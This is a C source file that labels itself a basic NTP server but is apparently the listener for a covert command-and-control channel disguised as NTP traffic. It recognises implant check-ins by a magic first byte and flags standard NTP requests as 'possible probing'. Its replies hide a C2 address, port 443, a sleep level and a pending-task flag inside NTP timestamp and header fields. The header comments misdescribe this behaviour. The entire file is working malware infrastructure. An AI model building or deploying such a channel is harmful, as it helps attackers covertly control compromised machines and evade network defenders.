// Basic NTP server
// 1. Create socket
// 2. Bind socket to port 123
// 3. Listen for incoming connections
// 4. Accept incoming connection
// 5. Receive NTP packet
// 6. Parse NTP packet
// 7. Print NTP packet
// 8. Send NTP packet
// 9. Close connection
// 10. Exit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define NTP_TIMESTAMP_DELTA 2208988800ull

#define DEFAULT_NTP_PACKET (char[]) {0x24, 0x04, 0x08, 0xe7, 0x00, 0x00, 0x01, 0x17, 0x00, 0x00, 0x00, 0x56, 0xe1, 0xfe, 0x1e, 0xbe, 0xe7, 0x70, 0x15, 0x39, 0xc0, 0x84, 0x50, 0xd8, 0xe7, 0x70, 0x16, 0x41, 0x78, 0xd2, 0x91, 0x32, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x4e, 0xc6, 0x9c, 0xe7, 0x70, 0x16, 0x41, 0x93, 0x51, 0xe5, 0x72}

int main() {
    int sockfd;
    struct sockaddr_in servaddr;
    struct sockaddr cliaddr;
    socklen_t cliaddr_len = sizeof(cliaddr);
    char buffer[1024];
    time_t t;
    unsigned int delta;
    int id;

    char pending = 1;

    srand(time(NULL));

    // Bind socket to port 123
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("Error creating socket");
        return 1;
    }
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
    servaddr.sin_port=htons(123);

    if(bind(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
        printf("Error binding socket");
        return 1;
    }

    // Listen for incoming connections
    while (1) {
        // Receive NTP packet
        int n = recvfrom(sockfd, buffer, 1024, 0, &cliaddr, &cliaddr_len);
        if (n == 48) {

            if ((unsigned char) buffer[0] == 0xe3) {
                id =  ntohl(*(unsigned int *)&buffer[40]) ^ (*(unsigned int *)&buffer[44]);
                printf("Received ping from %d\n", id);
            } else {
                id = -1;
                printf("  [WARNING]: Possible probing, received standard NTP request\n");
            }

            // Prep response
            memcpy(buffer, DEFAULT_NTP_PACKET, 16);
            memcpy(buffer + 24, buffer + 40, 8);

            t = time(NULL);
            delta = htonl(t + NTP_TIMESTAMP_DELTA);
            memcpy(&buffer[40], &delta, 4);
            memcpy(&buffer[32], &delta, 4);
            delta = rand();
            memcpy(&buffer[44], &delta, 4);
            delta = htonl(delta + (rand() % 100));
            memcpy(&buffer[36], &delta, 4);
            delta = htonl((t + NTP_TIMESTAMP_DELTA) - 4096 - (rand() % 100));
            memcpy(&buffer[16], &delta, 4);
            delta = rand();
            memcpy(&buffer[20], &delta, 4);

            if (id > -1) {
                char c2_ip[16];
                int c2_port = htonl(443);
                strcpy(c2_ip, "127.0.0.1");
                int c2_inet = inet_addr(c2_ip);
                unsigned char sleep_level = 3;

                
                memcpy(&buffer[4], &c2_port, 4);
                memcpy(&buffer[12], &c2_inet, 4);

                buffer[2] = sleep_level;
                buffer[47] = buffer[46] ^ buffer[45] ^ buffer[44] ^ pending;

                pending = 0;
            }

            // Send NTP packet
            sendto(sockfd, buffer, 48, 0, (struct sockaddr *)&cliaddr, sizeof(cliaddr));
        }

    }

}